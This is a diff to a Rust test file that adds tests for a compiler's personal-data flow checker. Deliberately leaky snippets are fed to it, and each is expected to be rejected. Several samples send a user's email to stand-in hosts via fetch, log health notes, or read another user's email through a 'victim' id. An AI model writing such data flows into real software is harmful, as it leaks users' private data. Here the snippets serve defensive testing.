@@ -942,6 +942,104 @@ fn a_runaway_call_on_a_server_fails_and_the_server_carries_on() {
     assert!(state(&mut rt, 3.0, "Spin/s")["n"].as_u64().unwrap() > 0);
 }
 
+/// The account object the flow tests build on.
+const PII_ACCOUNT: &str = r#"
+@server @read("owner", "support") object Account {
+  @pii("contact", "account", "billing") email: string = ""
+  @pii("health", "care") notes: string = ""
+  @pii("contact", "account") phones: string[] = []
+  plan: string = "free"
+  label: string = ""
+"#;
+
+/// Compiles PII_ACCOUNT plus `members` (inside Account) and `rest` (after it); the errors.
+fn flow(members: &str, rest: &str) -> String {
+    let src = format!("{PII_ACCOUNT}{members}\n}}\n{rest}");
+    compile(&src).err().map(|e| e.iter().map(|d| format!("{} | {}", d.message, d.hint.clone().unwrap_or_default())).collect::<Vec<_>>().join("\n")).unwrap_or_default()
+}
+
+#[test]
+fn personal_data_cannot_leave_without_a_purpose() {
+    // The plain sinks.
+    let leaks = [
+        (r#"@allow("owner") async send() { await fetch("https://x.example/?e=" + this.email) }"#, "reaches `fetch`"),
+        (r#"@allow("owner") tell() { this.emit("changed", { e: this.email }) }"#, "reaches `emit`"),
+        (r#"@allow("owner") fail() { throw new Error(`bad ${this.email}`) }"#, "reaches an error message"),
+        (r#"@allow("owner") log() { console.log(this.notes) }"#, "reaches the log"),
+        (r#"@allow("owner") copy() { this.label = this.email }"#, "reaches `this.label`, which is not marked as personal data"),
+        (r#"@allow("owner") later() { this.schedule(1000, "ping", this.email) }
+  private ping(e: string) { }"#, "reaches an alarm's arguments"),
+        (r#"@allow("anyone") show(): string { return this.email }"#, "is returned here to callers who do not own it"),
+        (r#"@allow("owner", "support") whole(): string { return JSON.stringify(this) }"#, "is returned here"),
+    ];
+    for (code, want) in leaks {
+        let e = flow(code, "");
+        assert!(e.contains(want), "{code}\n=> {e}");
+        assert!(e.contains("with the purpose it is sent for (account, billing)") || e.contains("reveal(value, \"care\")") || e.contains("different purposes"), "{e}");
+    }
+
+    // critic-reply-006 L1: someone else's data through an owner-only method.
+    let e = flow(r#"@allow("owner") peek(victim: string): string { return Account.get(victim).email }"#, "");
+    assert!(e.contains("may be about someone other than the caller"), "{e}");
+    let e = flow(r#"@allow("owner") steal(victim: string) { this.email = Account.get(victim).email }"#, "");
+    assert!(e.contains("may be about someone other than this object's owner"), "{e}");
+    // L2: through a container filled in another function.
+    let e = flow(r#"@allow("owner") run() {
+    const box: string[] = []
+    collect(box, this)
+    this.emit("ev", box)
+  }"#, "function collect(out: string[], a: Account) { out.push(a.email) }");
+    assert!(e.contains("reaches `emit`"), "{e}");
+    // L3: a module-level variable.
+    let e = flow(r#"@allow("owner") keep() { stash = this.email }"#, "let stash: string = \"\"");
+    assert!(e.contains("the module-level variable `stash`"), "{e}");
+    let e = flow(r#"@allow("owner") keep() { box.push(this.email) }"#, "const box: string[] = []");
+    assert!(e.contains("the module-level variable `box`"), "{e}");
+    // L4: the whole object, and a tool that hands it to the AI model.
+    let e = flow(r#"@allow("owner") all() { this.emit("x", `${this}`) }"#, "");
+    assert!(e.contains("the whole Account object"), "{e}");
+    let e = flow(r#"@allow("owner") myEmail(): string { return this.email }"#, r#"
+const tools = [{ name: "email", object: "Account/me", method: "myEmail", description: "", params: [], input: {}, fixed: {} }]"#);
+    assert!(e.contains("the tool Account.myEmail returns") && e.contains("AI model"), "{e}");
+    for object in ["`Account/${caller.id}`", "\"Account/\" + caller.id"] {
+        let tools = format!("function tools() {{ return [{{ name: \"email\", object: {object}, method: \"myEmail\", description: \"\", params: [], input: {{}}, fixed: {{}} }}] }}");
+        let e = flow(r#"@allow("owner") myEmail(): string { return this.email }"#, &tools);
+        assert!(e.contains("the tool Account.myEmail returns"), "{object}: {e}");
+    }
+
+    // Purposes are enforced, and mixing fields for different purposes is refused.
+    assert_eq!(flow(r#"@allow("owner") async bill() { await fetch("https://pay.example/?e=" + reveal(this.email, "billing")) }"#, ""), "");
+    let e = flow(r#"@allow("owner") async ad() { await fetch("https://ads.example/?e=" + reveal(this.email, "ads")) }"#, "");
+    assert!(e.contains("\"ads\" is not a purpose of this personal data: Account.email is for account, billing"), "{e}");
+    let e = flow(r#"@allow("owner") async both() { await fetch(reveal(`${this.email} ${this.notes}`, "account")) }"#, "");
+    assert!(e.contains("different purposes"), "{e}");
+}
+
+#[test]
+fn correct_code_with_personal_data_compiles() {
+    let ok = [
+        // F1: a helper that only reads what is not personal.
+        (r#"@allow("support") canUpgrade(id: string): boolean { return !isPaid(Account.get(id)) }"#, "function isPaid(a: Account): boolean { return a.plan !== \"free\" }"),
+        // F2: array callbacks over personal data, kept in a personal field.
+        (r#"@allow("owner") removePhone(p: string) { this.phones = this.phones.filter(x => x !== p) }"#, ""),
+        // F3: whether a field is filled in, and errors that do not contain it.
+        (r#"@allow("owner") ensure() { if (this.email === "") { throw new Error("please add an email") } }
+  @allow("owner", "support") hasEmail(): boolean { return this.email !== "" }"#, ""),
+        // F4: the owner's own data back to the owner, and on screen.
+        (r#"@allow("owner") mine(): string { return this.email }
+  @allow("owner") setEmail(e: string) { this.email = e.trim() }"#, r#"
+const me = Account.get("me")
+export function App() { return <Column><Text>{me.email}</Text></Column> }"#),
+        // Reading through the caller's own id in an owner-only method.
+        (r#"@allow("owner") echo(): string { return Account.get(caller.id).email }"#, ""),
+    ];
+    for (members, rest) in ok {
+        assert_eq!(flow(members, rest), "", "{members}");
+    }
+    // Apps without personal data are not checked at all.
+    assert!(compile("object A { n: number = 0\n  f() { console.log(this.n) } }").is_ok());
+}
+
 #[test]
 fn a_call_id_belongs_to_one_caller_and_one_call() {
     let mut rt = server(GUARDED, false);
